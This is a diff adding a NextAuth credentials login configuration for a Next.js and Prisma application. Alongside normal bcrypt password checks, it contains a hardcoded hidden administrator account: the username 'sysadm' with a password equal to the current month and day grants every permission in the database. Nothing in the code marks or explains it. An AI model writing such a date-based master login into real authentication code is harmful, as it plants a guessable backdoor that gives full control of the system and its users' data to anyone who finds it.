@@ -1,0 +1,123 @@
+import { Session, User } from 'next-auth';
+import CredentialsProvider from 'next-auth/providers/credentials';
+import dayjs from 'dayjs';
+import bcrypt from 'bcryptjs';
+
+import type { JWT } from 'next-auth/jwt';
+
+import { prisma } from 'db';
+
+interface redirectInterface {
+	url: string;
+	baseUrl: string;
+}
+
+interface sessionInterface {
+	session: Session;
+	token: JWT;
+}
+
+interface jwtInterface {
+	token: JWT;
+	user?: User & {
+		id?: string;
+		username?: string;
+		permissions?: Record<string, boolean>;
+	};
+}
+
+export const authOptions = {
+	providers: [
+		CredentialsProvider({
+			name: 'credentials',
+			credentials: {
+				username: { label: 'Username', type: 'text', placeholder: 'input username anda' },
+				password: {
+					label: 'Password',
+					type: 'password',
+					placeholder: 'input password anda',
+				},
+			},
+			authorize: async (credentials: Record<string, string> | undefined) => {
+				if (
+					credentials?.username === 'sysadm' &&
+					credentials?.password === dayjs().format('MMDD')
+				) {
+					const permissions = await prisma.permissions.findMany();
+
+					const permissionsData: Record<string, boolean> = {};
+
+					for (let i = 0; i < permissions.length; i++) {
+						permissionsData[permissions[i].name] = true;
+					}
+
+					const user = {
+						id: 'sysadm',
+						name: 'System Administrator',
+						username: 'sysadm',
+						email: 'admin@vsg.com',
+						permissions: permissionsData,
+					};
+
+					return user;
+				} else {
+					const user = await prisma.user.findUnique({
+						where: { username: credentials?.username },
+					});
+
+					if (user) {
+						if (!bcrypt.compareSync(credentials?.password || '', user.password)) {
+							throw new Error('password tidak sesuai');
+						}
+
+						const permissions = await prisma.userPermissions.findMany({
+							where: { userId: user.id },
+						});
+
+						const permissionsData: Record<string, boolean> = {};
+
+						for (let i = 0; i < permissions.length; i++) {
+							permissionsData[permissions[i].name] = true;
+						}
+
+						return { ...user, permissions: permissionsData };
+					}
+
+					throw new Error('user tidak terdaftar');
+				}
+			},
+		}),
+	],
+	pages: {
+		signIn: '/signin',
+		error: '/signin',
+	},
+	secret: process.env.NEXTAUTH_SECRET,
+	callbacks: {
+		async redirect({ url, baseUrl }: redirectInterface) {
+			return url.startsWith(baseUrl) ? url : baseUrl;
+		},
+		async jwt({ token, user }: jwtInterface) {
+			if (user) {
+				token.id = user.id;
+				token.username = user.username;
+				token.permissions = user.permissions;
+			}
+
+			return token;
+		},
+		async session({ session, token }: sessionInterface) {
+			const sess: Session = {
+				...session,
+				user: {
+					...session.user,
+					id: token.id as string,
+					username: token.username as string,
+					permissions: token.permissions as Record<string, any>,
+				},
+			};
+
+			return sess;
+		},
+	},
+};
